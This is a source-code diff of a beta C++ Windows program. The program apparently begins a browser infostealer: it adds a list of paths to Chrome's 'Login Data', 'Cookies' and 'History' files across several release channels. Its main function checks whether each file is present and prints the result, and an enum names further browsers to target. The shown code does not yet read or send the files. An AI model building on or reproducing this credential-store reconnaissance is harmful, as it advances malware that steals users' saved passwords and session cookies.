@@ -1,5 +1,10 @@
-#include <iostream>
+#include <unordered_map>
 #include <string>
+#include <fstream>
+#include <vector>
+#include <iostream>
+#include <windows.h>
+
 using namespace std;
 
 // TO ADD
@@ -72,7 +77,71 @@ MORE IDEAS:
 string status = "Beta";
 double version = 0.1;
 
+unordered_map<string, vector<string>> known_browser_paths = {
+    {"Chrome", {
+        R"(%LOCALAPPDATA%\Google\Chrome\User Data\Default\History)",
+        R"(%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data)",
+        R"(%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies)",
+        R"(%LOCALAPPDATA%\Google\Chrome SxS\User Data\Default\History)",
+        R"(%LOCALAPPDATA%\Google\Chrome SxS\User Data\Default\Login Data)",
+        R"(%LOCALAPPDATA%\Google\Chrome SxS\User Data\Default\Network\Cookies)",
+        R"(%LOCALAPPDATA%\Google\Chrome Beta\User Data\Default\History)",
+        R"(%LOCALAPPDATA%\Google\Chrome Beta\User Data\Default\Login Data)",
+        R"(%LOCALAPPDATA%\Google\Chrome Beta\User Data\Default\Network\Cookies)",
+        R"(%LOCALAPPDATA%\Google\Chrome Dev\User Data\Default\History)",
+        R"(%LOCALAPPDATA%\Google\Chrome Dev\User Data\Default\Login Data)",
+        R"(%LOCALAPPDATA%\Google\Chrome Dev\User Data\Default\Network\Cookies)",
+        R"(%LOCALAPPDATA%\Google\Chrome Unstable\User Data\Default\History)",
+        R"(%LOCALAPPDATA%\Google\Chrome Unstable\User Data\Default\Login Data)",
+        R"(%LOCALAPPDATA%\Google\Chrome Unstable\User Data\Default\Network\Cookies)",
+        R"(%LOCALAPPDATA%\Google\Chrome Canary\User Data\Default\History)",
+        R"(%LOCALAPPDATA%\Google\Chrome Canary\User Data\Default\Login Data)",
+        R"(%LOCALAPPDATA%\Google\Chrome Canary\User Data\Default\Network\Cookies)",
+    }},
+};
+
+enum Browsers {
+    Chrome,
+    Edge,
+    Brave,
+    OperaGX,
+    Firefox,
+    Opera,
+};
+
+bool fileExists(const string& filePath) {
+    DWORD dwAttrib = GetFileAttributesA(filePath.c_str());
+    return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
+}
+
+string expandEnvironmentVariables(const string& path) {
+    char buffer[MAX_PATH];
+    ExpandEnvironmentStringsA(path.c_str(), buffer, sizeof(buffer));
+    return buffer;
+}
+
+void checkBrowserPaths(const string& browserName) {
+    for (const string& path : known_browser_paths[browserName]) {
+        string expandedPath = expandEnvironmentVariables(path);
+        if (fileExists(expandedPath)) {
+            cout << "OK | File exists: " << expandedPath << endl;
+        } else {
+            cout << "NOT FOUND | File does not exist: " << expandedPath << endl;
+        }
+    }
+}
+
+
+void LocateBrowsers() {
+    cout << "start" << endl;
+    for (const auto& [browserName, paths] : known_browser_paths) {
+        checkBrowserPaths(browserName);
+    }
+    cout << "end" << endl;
+}
+
 int main() {
     cout << "hi!" << endl;
+     LocateBrowsers();
     return 0;
 }
